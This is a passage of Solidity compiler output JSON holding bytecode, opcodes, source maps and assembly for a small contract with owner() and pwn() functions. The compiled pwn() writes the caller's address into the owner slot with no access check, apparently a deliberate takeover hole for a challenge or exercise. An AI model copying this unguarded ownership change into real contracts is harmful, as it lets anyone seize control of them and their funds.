0x50 SWAP2 SWAP1 PUSH2 0x10A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF4 DUP3 PUSH2 0xC9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x104 DUP2 PUSH2 0xE9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x11F PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE6 SWAP15 SWAP12 0xBB CODECOPY 0xC2 CALLDATASIZE 0xB6 CHAINID CALLER CALLER SHR 0xBD LOG1 SHR PC PUSH9 0xA4C70A7A30C6846BCA 0xF6 0x2D CALLER PUSH28 0xAD8F64736F6C63430008110033000000000000000000000000000000 ",
							"sourceMap": "60:169:0:-:0;;;112:55;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;155:6;147:5;;:14;;;;;;;;;;;;;;;;;;112:55;60:169;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;60:169:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@owner_3": {
									"entryPoint": 99,
									"id": 3,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@pwn_22": {
									"entryPoint": 135,
									"id": 22,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 251,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 266,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 233,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 201,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:590:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "52:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "62:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "77:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "84:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "73:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "73:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "34:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "44:7:1",
														"type": ""
													}
												],
												"src": "7:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "184:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "194:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "223:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "205:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "205:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "194:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "166:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "176:7:1",
														"type": ""
													}
												],
												"src": "139:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "306:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "323:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "346:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "328:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "328:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "316:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "316:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "316:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "294:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "301:3:1",
														"type": ""
													}
												],
												"src": "241:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "463:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "473:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "485:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "496:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "481:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "481:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "473:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "553:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "566:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "577:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "562:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "562:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "509:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "509:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "509:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "435:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "447:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "458:4:1",
														"type": ""
													}
												],
												"src": "365:222:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80638da5cb5b1461003b578063dd365b8b14610059575b600080fd5b610043610063565b604051610050919061010a565b60405180910390f35b610061610087565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100f4826100c9565b9050919050565b610104816100e9565b82525050565b600060208201905061011f60008301846100fb565b9291505056fea2646970667358221220e69e9bbb39c236b64633331cbda11c5868a4c70a7a30c6846bcaf62d337bad8f64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x59 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x10A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x61 PUSH2 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF4 DUP3 PUSH2 0xC9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x104 DUP2 PUSH2 0xE9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x11F PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xFB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE6 SWAP15 SWAP12 0xBB CODECOPY 0xC2 CALLDATASIZE 0xB6 CHAINID CALLER CALLER SHR 0xBD LOG1 SHR PC PUSH9 0xA4C70A7A30C6846BCA 0xF6 0x2D CALLER PUSH28 0xAD8F64736F6C63430008110033000000000000000000000000000000 ",
							"sourceMap": "60:169:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;85:20;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;173:53;;;:::i;:::-;;85:20;;;;;;;;;;;;:::o;173:53::-;210:10;202:5;;:18;;;;;;;;;;;;;;;;;;173:53::o;7:126:1:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "69400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"owner()": "2489",
								"pwn()": "24410"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 112,
									"end": 167,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 112,
									"end": 167,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 155,
									"end": 161,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 147,
									"end": 152,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 147,
									"end": 152,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 147,
									"end": 161,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 147,
									"end": 161,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 147,
									"end": 161,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 147,
									"end": 161,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 112,
									"end": 167,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 60,
									"end": 229,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 60,
									"end": 229,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 60,
